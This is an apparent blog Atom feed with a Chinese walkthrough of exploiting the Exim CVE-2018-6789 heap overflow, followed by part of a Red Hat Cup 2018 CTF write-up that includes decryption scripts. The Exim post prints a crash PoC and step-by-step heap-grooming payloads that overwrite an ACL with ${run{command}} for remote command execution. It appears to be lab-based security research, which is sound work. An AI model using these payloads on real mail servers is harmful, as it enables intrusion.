<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HackingFun</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://skysider.github.io/"/>
  <updated>2018-05-11T17:22:28.785Z</updated>
  <id>https://skysider.github.io/</id>
  
  <author>
    <name>Skysider</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Exim off-by-one 漏洞利用</title>
    <link href="https://skysider.github.io/2018/05/12/Exim-off-by-one-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://skysider.github.io/2018/05/12/Exim-off-by-one-漏洞利用/</id>
    <published>2018-05-11T17:18:59.000Z</published>
    <updated>2018-05-11T17:22:28.785Z</updated>
    
    <content type="html"><![CDATA[<p>2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。</p><p><img src="https://i.loli.net/2018/05/12/5af5cfacad3c5.png" alt="msg.png"></p><p>基于Meh的思路在特定环境下复现了漏洞利用的过程，最终达成远程命令执行，相关的<a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789" target="_blank" rel="noopener">漏洞环境和验证代码</a> （<a href="https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789）已公开。</a></p><h3 id="1-漏洞成因"><a href="#1-漏洞成因" class="headerlink" title="1. 漏洞成因"></a>1. 漏洞成因</h3><p>漏洞的成因是b64decode函数在对不规范的base64编码过的数据进行解码时可能会溢出堆上的一个字节，比较经典的off-by-one漏洞。</p><p>存在漏洞的b64decode函数部分代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64decode(<span class="keyword">const</span> uschar *code, uschar **ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line">uschar *result = store_get(<span class="number">3</span>*(Ustrlen(code)/<span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">*ptr = result;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each cycle of the loop handles a quantum of 4 input bytes. For the last</span></span><br><span class="line"><span class="comment">quantum this may decode to 1, 2, or 3 output bytes. */</span></span><br><span class="line"> ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码解码base64的逻辑是把4个字节当做一组，4个字节解码成3个字节，但是当最后余3个字节（即len(code)=<code>4n+3</code>）时，会解码成2个字节，解码后的总长度为 <code>3n+2</code> 字节，而分配的堆空间的大小为<code>3n+1</code> ，因此就会发生堆溢出。当然，官方给出的修补方案也很简单，多分配几个字节就可以了。</p><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h3><p>Meh博客中漏洞测试的exim版本是直接通过apt安装的，但是由于debian官方已经修复了仓库中exim的漏洞，可以通过查看软件包源码的patch信息确认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@skysider:~/poc/exim4-4.86.2# apt-get source exim4</span><br><span class="line">......</span><br><span class="line">dpkg-source: info: applying 93_CVE-2017-1000368.patch</span><br><span class="line">dpkg-source: info: applying fix_smtp_banner.patch</span><br><span class="line">dpkg-source: info: applying CVE-2016-9963.patch</span><br><span class="line">dpkg-source: info: applying CVE-2018-6789.patch</span><br></pre></td></tr></table></figure><p>我们选择下载早期版本的源代码进行编译安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get build-dep exim4</span><br><span class="line">wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz</span><br></pre></td></tr></table></figure><p>在编译过程中要安装一些依赖库，还需要修改Makefile、新建用户、配置日志文件的权限等，可以参考<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile" target="_blank" rel="noopener">Dockerfile</a>（<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/Dockerfile）的安装过程。</a></p><p>exim可以在运行时指定配置文件，为了触发漏洞以及命令执行，需要配置CRAM-MD5 authenticator以及设置acl_smtp_mail等，配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">acl_smtp_mail=acl_check_mail</span><br><span class="line">acl_smtp_data=acl_check_data</span><br><span class="line">begin acl</span><br><span class="line">acl_check_mail:</span><br><span class="line">  .ifdef CHECK_MAIL_HELO_ISSUED</span><br><span class="line">  deny</span><br><span class="line">    message = no HELO given before MAIL command</span><br><span class="line">    condition = $&#123;if def:sender_helo_name &#123;no&#125;&#123;yes&#125;&#125;</span><br><span class="line">  .endif</span><br><span class="line"></span><br><span class="line">  accept</span><br><span class="line"></span><br><span class="line">acl_check_data:</span><br><span class="line">  accept</span><br><span class="line"></span><br><span class="line">begin authenticators</span><br><span class="line">fixed_cram:</span><br><span class="line">  driver = cram_md5</span><br><span class="line">  public_name = CRAM-MD5</span><br><span class="line">  server_secret = $&#123;if eq&#123;$auth1&#125;&#123;ph10&#125;&#123;secret&#125;fail&#125;</span><br><span class="line">  server_set_id = $auth1</span><br></pre></td></tr></table></figure><p>以调试模式启动exim服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim -bd -d-receive -C conf.conf</span><br></pre></td></tr></table></figure><p>也可以直接使用docker来验证该漏洞（上面的命令为默认启动命令）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name exim -p 25:25 skysider/vulndocker:cve-2018-6789</span><br></pre></td></tr></table></figure><h3 id="3-漏洞测试"><a href="#3-漏洞测试" class="headerlink" title="3. 漏洞测试"></a>3. 漏洞测试</h3><p>我们使用一个简单的poc来触发漏洞，poc代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import smtplib</span><br><span class="line">from base64 import b64encode</span><br><span class="line"></span><br><span class="line">print &quot;this poc is tested in exim 4.89 x64 bit with cram-md5 authenticators&quot;</span><br><span class="line">ip_address = raw_input(&quot;input ip address: &quot;)</span><br><span class="line">s = smtplib.SMTP(ip_address)</span><br><span class="line">#s.set_debuglevel(1)</span><br><span class="line"># 1. put a huge chunk into unsorted bin</span><br><span class="line">s.ehlo(&quot;mmmm&quot;+&quot;b&quot;*0x1500) # 0x2020</span><br><span class="line"></span><br><span class="line"># 2. send base64 data and trigger off-by-one</span><br><span class="line">#raw_input(&quot;overwrite one byte of next chunk&quot;)</span><br><span class="line">s.docmd(&quot;AUTH CRAM-MD5&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;d&quot;*(0x2008-1)</span><br><span class="line">try:</span><br><span class="line">s.docmd(b64encode(payload)+b64encode(&apos;\xf1\xf1&apos;)[:-1])</span><br><span class="line">s.quit()</span><br><span class="line">except smtplib.SMTPServerDisconnected:</span><br><span class="line">print &quot;[!] exim server seems to be vulnerable to CVE-2018-6789.&quot;</span><br></pre></td></tr></table></figure><p>当执行这段代码时，会触发内存错误</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9548163.png" alt="core_dump.png"></p><p>在这个过程中，堆的主要变化如下：</p><p><img src="https://i.loli.net/2018/05/12/5af5cfac95fe6.png" alt="poc.png"></p><p>我们可以去观察错误之前的堆，attach到子进程，下图是发送ehlo消息之后的堆：</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2d053c.png" alt="heap_1.png"></p><p>发送Auth数据之后，我们可以看一下执行完b64decode函数之后的堆：</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2e5ee3.png" alt="heap_2.png"></p><p>图中圈出来的两个字节正是我们发送的Auth数据解码出来的最后两个字节，最后一个字节0xf1修改了下一个块的大小，使得原本应该是0x4040（0x6060-0x2020）的unsorted 空闲块变成了0x40f0，通过查看该空闲块紧邻的下一个堆块可以确认当前unsorted bin的空闲块大小是被修改了，因此当从该空闲块分配空间时，malloc函数会检查该空闲块的大小 <code>0x40f0</code>  (低字节的低3位是标志位）与紧邻的下一个堆块标记的前一个堆块的大小 <code>0x4040</code> 是否相等，若不相等，就会触发内存错误。</p><h3 id="4-exim内存管理机制"><a href="#4-Exim内存管理机制" class="headerlink" title="4. Exim内存管理机制"></a>4. Exim内存管理机制</h3><p>exim在libc提供的堆管理机制的基础上实现了一套自己的管理堆块的方法，引入了store pool、store block的概念。store pool是一个单链表结构，每一个节点都是一个store block，每个store block的数据大小至少为0x2000，storeblock的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* Structure describing the beginning of each big block. */</span><br><span class="line"></span><br><span class="line">typedef struct storeblock &#123;</span><br><span class="line">  struct storeblock *next;</span><br><span class="line">  size_t length;</span><br><span class="line">&#125; storeblock;</span><br></pre></td></tr></table></figure><p>下图展示了一个storepool的完整的数据存储方式，chainbase是头结点，指向第一个storeblock，current_block是尾节点，指向链表中的最后一个节点。store_last_get指向current_block中最后分配的空间，next_yield指向下一次要分配空间时的起始位置，yield_length则表示当前store_block中剩余的可分配字节数。当current_block中的剩余字节数（yield_length）小于请求分配的字节数时，会调用malloc分配一个新的storeblock块，然后从该storeblock中分配需要的空间。更多关于exim内存管理机制可以查看<a href="https://github.com/Exim/exim/blob/master/src/src/store.c" target="_blank" rel="noopener">store.c</a>。</p><p><img src="https://i.loli.net/2018/05/12/5af5cfaca940f.png" alt="store.png"></p><h3 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5. 漏洞利用"></a>5. 漏洞利用</h3><p>整体的漏洞利用思路参考漏洞发现者Meh的博客，通过覆盖acl字符串为 <code>${run{command}}</code> 的方式，达到远程命令执行的目的。因为不同的配置和启动参数可能会导致exim服务在启动运行过程中堆栈布局存在差异，因此漏洞利用脚本仅在给定的环境中测试生效。</p><p>下面是漏洞利用的详细步骤：</p><p><img src="https://i.loli.net/2018/05/12/5af5cd954900f.png" alt="exp1.png"></p><ol><li>发送ehlo，布局堆空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"a"</span>*<span class="number">0x1000</span>) <span class="comment"># 0x2020</span></span><br><span class="line">ehlo(s, <span class="string">"a"</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>   形成一块大小为0x7040的空闲堆块</p><ol start="2"><li>发送unknown command（包含不可打印字符）从unsorted bin分配内存空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docmd(s, <span class="string">"\xee"</span>*<span class="number">0x700</span>)</span><br></pre></td></tr></table></figure><p>发送的unknown command 的大小要满足 <code>yield_length &lt; (length + nonprintcount * 3 + 1)</code>  ，从而使得发送的unknown command能够调用malloc函数分配一个新的storeblock。</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9549657.png" alt="exp2.png"></p><ol start="3"><li>发送ehlo信息回收unknown命令分配的空间</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"c"</span>*<span class="number">0x2c00</span>)</span><br></pre></td></tr></table></figure><p>在回收unknown command占用的内存空间时，由于之前的sender_host_name占用的内存空间已经释放，会发生合并，形成大小为0x2050的空闲块</p><ol start="4"><li>发送Auth数据，触发漏洞，修改ehlo信息所在堆块的大小</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"d"</span>*(<span class="number">0x2020</span>+<span class="number">0x30</span><span class="number">-0x18</span><span class="number">-1</span>)</span><br><span class="line">docmd(s, b64encode(payload)+b64encode(<span class="string">"\xf1\xf1"</span>)[:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><ol start="5"><li>发送Auth数据伪造下一个块的块头信息，绕过释放sender_host_name所在堆块时的内存检查</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">'m'</span>*<span class="number">0x70</span>+p64(<span class="number">0x1f41</span>) <span class="comment"># modify fake size</span></span><br><span class="line">docmd(s, b64encode(payload2))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/12/5af5cd9549405.png" alt="exp3.png"></p><ol start="6"><li>释放sender_host_name所在堆块，同时为了不释放其他storeblock，发送包含无效字符的信息</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, <span class="string">"skysider+"</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li>发送Auth数据，修改overlapped所在storeblock的next指针，令其指向acl字符串所在的storeblock</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x2bf0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x2021</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">try_addr = p16(try_addr*<span class="number">0x10</span>+<span class="number">4</span>)  <span class="comment"># to change</span></span><br><span class="line">docmd(s, b64encode(payload3)+b64encode(try_addr)[:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure><p>由于地址随机化，acl所在的storeblock高位字节未知（在docker环境下，低12bit为0x480不变），但是原始的next指针指向的storeblock与要修改的storeblock高位字节相同，仅低位3字节不同，因此可以采用局部overwrite，只需要爆破12bit即可。</p><ol start="8"><li>发送ehlo消息释放所有的storeblock</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ehlo(s, &quot;released&quot;)</span><br></pre></td></tr></table></figure><p>此时unsorted bin表中存在多个空闲块，如下图所示，其中框出来的空闲块就是包含acl的storeblock</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9525b77.png" alt="attach.png"></p><ol start="9"><li>覆盖acl字符串</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload4 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(<span class="number">0xb1</span>) + <span class="string">'t'</span>*(<span class="number">0xb0</span><span class="number">-0x10</span>) + p64(<span class="number">0xb0</span>) + p64(<span class="number">0x1f40</span>)</span><br><span class="line">payload4 += <span class="string">'t'</span>*(<span class="number">0x1f80</span>-len(payload4))</span><br><span class="line">auth(s, b64encode(payload4)+<span class="string">'ee'</span>)</span><br><span class="line">payload5 = <span class="string">"a"</span>*<span class="number">0x78</span> + <span class="string">"$&#123;run&#123;"</span> + command + <span class="string">"&#125;&#125;\x00"</span></span><br><span class="line">auth(s, b64encode(payload5)+<span class="string">"ee"</span>)</span><br></pre></td></tr></table></figure><p>发送第一个auth消息之后，unsorted bin表如下图所示</p><p><img src="https://i.loli.net/2018/05/12/5af5cd9525b76.png" alt="attach2.png"></p><p>接着再分配合适的空间时，就可以获取目标storeblock所在的堆块，覆盖其中的acl字符串</p><p><img src="https://i.loli.net/2018/05/12/5af5cee2e888e.png" alt="heap_9.png"></p><ol start="10"><li>触发acl检查</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.sendline(&quot;MAIL FROM: &lt;test@163.com&gt;&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/12/5af5cd953d208.png" alt="exec.png"></p><p><img src="https://i.loli.net/2018/05/12/5af5cd953d3c5.png" alt="execute.png"></p><p>至此就可以远程执行命令，完整的漏洞利用脚本见<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py" target="_blank" rel="noopener">exp.py</a> （<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下：" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/exp.py），效果如下：</a></p><p><img src="https://i.loli.net/2018/05/12/5af5cee2c4e0d.png" alt="final.png"></p><p><strong>注</strong>：该漏洞利用脚本仅用于交流学习与安全研究，请勿用于非法用途。</p><h3 id="参考"><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html" target="_blank" rel="noopener">https://www.exim.org/exim-html-current/doc/html/spec_html/ch-access_control_lists.html</a></li><li><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="noopener">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></li><li><a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/" target="_blank" rel="noopener">https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018年2月，流行的邮件服务器Exim曝出了堆溢出漏洞（CVE-2018-6789），几乎影响了之前的所有版本。该漏洞的发现者——台湾安全研究员Meh在博客上提供了利用该漏洞进行远程代码执行的思路，在推特中也表明了最终绕过各种缓解措施成功达成远程代码执行。&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="exploit" scheme="https://skysider.github.io/categories/exploit/"/>
    
    
      <category term="cve-2018-6789" scheme="https://skysider.github.io/tags/cve-2018-6789/"/>
    
      <category term="off-by-one" scheme="https://skysider.github.io/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯2018</title>
    <link href="https://skysider.github.io/2018/05/11/2018redhat/"/>
    <id>https://skysider.github.io/2018/05/11/2018redhat/</id>
    <published>2018-05-10T17:05:15.000Z</published>
    <updated>2018-05-11T16:41:37.101Z</updated>
    
    <content type="html"><![CDATA[<p>熬了一天，感觉pwn和re的水平退步不少。</p><h3 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>这次比赛中的pwn的题目难度一般，3个pwn分别涉及到</p><ul><li>栈溢出 ——game server</li><li>null byte offset-by-one —— shellcode manager</li><li>格式化串漏洞 —— Starcraft RPG</li></ul><p>中间在漏洞利用过程中也踩到了一些坑（可能是长期没打没有手感，有时间会整理一下）。</p><h3 id="re"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>re只看了最简单的icm，感觉自己re方面真是非常菜，赛后重新整理了getFlag的脚本，进行了简化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">    pip install cryptography</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherAlgorithm</span><span class="params">(key, mode)</span>:</span></span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.IDEA(key), mode, backend=backend)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plainMsg, key, mode)</span>:</span></span><br><span class="line">    cipher = getCipherAlgorithm(key, mode)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    res = encryptor.update(plainMsg) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipherMsg, key, mode)</span>:</span></span><br><span class="line">    cipher = getCipherAlgorithm(key, mode)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    res = decryptor.update(cipherMsg) + decryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">    res = []</span><br><span class="line">    buf = <span class="string">""</span></span><br><span class="line">    libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</span><br><span class="line">    libc.srand(<span class="number">0x78C819C3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        buf += <span class="string">"&#123;:02x&#125;"</span>.format(libc.rand() % <span class="number">256</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherText</span><span class="params">()</span>:</span></span><br><span class="line">    secret = [</span><br><span class="line">        <span class="number">0xd0</span>,  <span class="number">0xe0</span>,  <span class="number">0xab</span>,  <span class="number">0x9c</span>,  <span class="number">0xcd</span>,  <span class="number">0x78</span>,  <span class="number">0x5b</span>,  <span class="number">0x54</span>,</span><br><span class="line">        <span class="number">0x3d</span>,  <span class="number">0xe4</span>,  <span class="number">0xea</span>,  <span class="number">0x33</span>,  <span class="number">0x51</span>,  <span class="number">0x44</span>,  <span class="number">0x6d</span>,  <span class="number">0x3c</span>,</span><br><span class="line">        <span class="number">0x4e</span>,  <span class="number">0xce</span>,  <span class="number">0xdf</span>,  <span class="number">0xb5</span>,  <span class="number">0x41</span>,  <span class="number">0x0</span>,  <span class="number">0x1c</span>,  <span class="number">0xec</span>,</span><br><span class="line">        <span class="number">0xe3</span>,  <span class="number">0x1b</span>,  <span class="number">0xc3</span>,  <span class="number">0x8c</span>,  <span class="number">0x91</span>,  <span class="number">0x25</span>,  <span class="number">0x7f</span>,  <span class="number">0x1b</span>,</span><br><span class="line">        <span class="number">0x60</span>,  <span class="number">0xfe</span>,  <span class="number">0x35</span>,  <span class="number">0x9c</span>,  <span class="number">0xea</span>,  <span class="number">0x4</span>,  <span class="number">0x4c</span>,  <span class="number">0x87</span>,</span><br><span class="line">        <span class="number">0x8d</span>,  <span class="number">0x97</span>,  <span class="number">0x93</span>,  <span class="number">0x5c</span>,  <span class="number">0xb8</span>,  <span class="number">0x9a</span>,  <span class="number">0x70</span>,  <span class="number">0x75</span>,</span><br><span class="line">    ]</span><br><span class="line">    buf = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">        secret[i] = (<span class="number">119</span>-i) ^ secret[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(secret)):</span><br><span class="line">        secret[i] = secret[i] ^ (<span class="number">8</span> - i%<span class="number">8</span>)</span><br><span class="line">        buf += <span class="string">"&#123;:02x&#125;"</span>.format(secret[i]).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></span><br><span class="line">    cipherText = getCipherText()</span><br><span class="line">    key = getKey()</span><br><span class="line">    mode = modes.ECB()</span><br><span class="line">    msg = decrypt(cipherText, key, mode)</span><br><span class="line">    <span class="keyword">print</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    getFlag()</span><br></pre></td></tr></table></figure><p>wcm解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SM4 from https://github.com/yixiangzhike/AlgorithmSM</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> SM4 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    libc = cdll.msvcrt</span><br><span class="line">    libc.srand(<span class="number">0x2872DD1B</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        key += <span class="string">"&#123;:02x&#125;"</span>.format(libc.rand() % <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> key.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherText</span><span class="params">()</span>:</span></span><br><span class="line">    secret = [</span><br><span class="line">        <span class="number">0xf4</span>,  <span class="number">0x88</span>,  <span class="number">0x91</span>,  <span class="number">0xc2</span>,  <span class="number">0x9b</span>,  <span class="number">0x20</span>,  <span class="number">0x5b</span>,  <span class="number">0x3</span>,</span><br><span class="line">        <span class="number">0xf1</span>,  <span class="number">0xed</span>,  <span class="number">0xf6</span>,  <span class="number">0x13</span>,  <span class="number">0x46</span>,  <span class="number">0x3c</span>,  <span class="number">0x55</span>,  <span class="number">0x81</span>,</span><br><span class="line">     